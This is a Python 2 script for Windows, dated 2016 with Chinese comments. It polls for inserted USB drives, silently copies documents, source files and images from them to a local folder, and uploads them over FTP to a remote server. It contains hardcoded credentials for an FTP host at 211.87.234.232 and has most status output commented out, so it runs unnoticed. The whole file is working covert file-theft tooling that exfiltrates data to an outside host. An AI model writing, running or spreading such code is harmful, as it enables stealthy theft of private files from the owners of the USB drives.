#coding=utf-8
'''
Created on 2016年6月9日

@author: pangb
'''

import os
import time 
import shutil
import string
import win32file  
import traceback
from ftplib import FTP  
import sys, getpass, os.path  

def getdrives():  
    drives=[]  
    sign=win32file.GetLogicalDrives()  
    drive_all=["A:\\","B:\\","C:\\","D:\\","E:\\","F:\\","G:\\","H:\\","I:\\",  
                "J:\\","K:\\","L:\\","M:\\","N:\\","O:\\","P:\\","Q:\\","R:\\",  
                "S:\\","T:\\","U:\\","V:\\","W:\\","X:\\","Y:\\","Z:\\"]  
    for i in range(25):  
        if (sign&1<<i):  
            if win32file.GetDriveType(drive_all[i])==2:  
                drives.append(drive_all[i])  
    return drives  
  
def is_UDisk(drives):  
    UDisk=[]  
    for item in drives:  
        try :  
            free_bytes,total_bytes,total_free_bytes=win32file.GetDiskFreeSpaceEx(item)  
            if (total_bytes/1024/1024/1024)<17:  
                UDisk.append(item)  
        except :  
            break  
    return UDisk  

USB = 'G:\\'  #u盘目录
SAVE = 'D:\\usbcopy\\'  #保存目录
#注意此目录的上级目录必须存在
OLD=[]
host = "211.87.234.232"
username = "team"
password = "team123"
remotefile = "~/master"

# 文件类型
word="txt,doc,docx,ppt,pptx,cpp,xls,pdf,ms10,pdf,jpg,\
jpeg,png,gif,TXT,DOC,DOCX,PPT,PPTX,CPP,XLS,PDF,MS10,\
PDF,JPG,JPEG,PNG,GIF".split(",")[:-1]

#判断文件是否需要复制
def value(file):
    if os.path.isfile(file)==False:
        return 0
    for i in word:
        if string.find(file,i)>-1:
            return 1
    return 0
#拷贝文件
def copyfile(file,filename):
    #print SAVE+time.strftime("%m%d%H%M",time.localtime(time.time()))+filename
    shutil.copy(file,SAVE+time.strftime("%m%d%H%M",time.localtime(time.time()))+"#"+filename)

def upload():
    host = 'xxx.xxx.xxx.xxx'
    username = 'name'
    password = 'password'
    remotepath = '/master'
    f = FTP(host)
    print 'connect'
    f.login(username, password)
    print 'connect success'
    f.cwd(remotepath)
    for root, dirs, files in os.walk(USB): 
        for file in files:
            export = os.path.join(root,file)
            try :
                if value(export):
                    #print "复制#"+export
                    #copyfile(export,file)
                    fd = open(export)
                    f.set_pasv(0)
                    f.storbinary('STOR '+ file, fd, 1024)
                    fd.close()
                    
            except: 
                 print("忽略")
                 traceback.print_exc()
    f.quit
    return 
    
#U盘遍历
def usbWalker():
    if not os.path.exists(SAVE): 
        os.mkdir(SAVE)
    #print "开始抓取U盘"
    f=open(SAVE+time.strftime("%m%d%H%M",time.localtime(time.time()))+".txt","w")
    for root, dirs, files in os.walk(USB): 
        for file in files:
            export = os.path.join(root,file)
            f.writelines(export+'\n')
            try :
                if value(export):
                    #print "复制#"+export
                    copyfile(export,file)
            except: 
                 print("忽略")
    f.close
    #print "拷贝文件完成"
            
#简单判断U盘内容是否变化
def getusb():
    global OLD
    NEW=os.listdir(USB)
    if (len(NEW)==len(OLD)):
        #print "U盘内容没有变化"
        return 0
    else:
        OLD=NEW
        return 1
#如果存在配置文件则读入
if os.path.isfile("set.ini"):
    #print "读入配置"
    ff=open("set.ini","r")
    USB=ff.readline()[:-1]
    SAVE=ff.readline()[:-1]
    word=ff.readline().split(",")[:-1]
    #print USB,SAVE,word
        
while(1):
    #if os.path.exists(USB):
    devices = getdrives()
    if len(devices) > 0:
        #print devices
        #print "检测到U盘"
        USB=devices[0]
        if getusb():
            try :
                usbWalker()
                upload()
            except:
                print "未知错误"
            print 'done'
            sys.exit()
    #print "开始休眠"
    
    time.sleep(10) #休眠时间
    #print "休眠结束"